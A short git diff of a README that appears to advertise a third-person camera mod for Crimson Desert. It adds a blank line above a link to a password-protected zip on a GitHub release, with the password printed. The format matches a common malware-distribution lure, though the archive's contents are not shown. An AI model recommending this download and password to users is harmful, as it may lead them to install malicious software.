@@ -16,6 +16,7 @@
 ## 📥 Download
 
 Password-protected archive with the complete camera mod – extract and enjoy a much better camera instantly.  
+
 📥 [Download `Proper-3rd-Person-Camera-Crimson-Desert-2026.zip`](https://github.com/ShahidAhmed1st/Proper-3rd-Person-Camera-Crimson-Desert/releases/download/Game-Addons/Proper-3rd-Person-Camera.zip)  
 🔐 `LS2026`
 ---
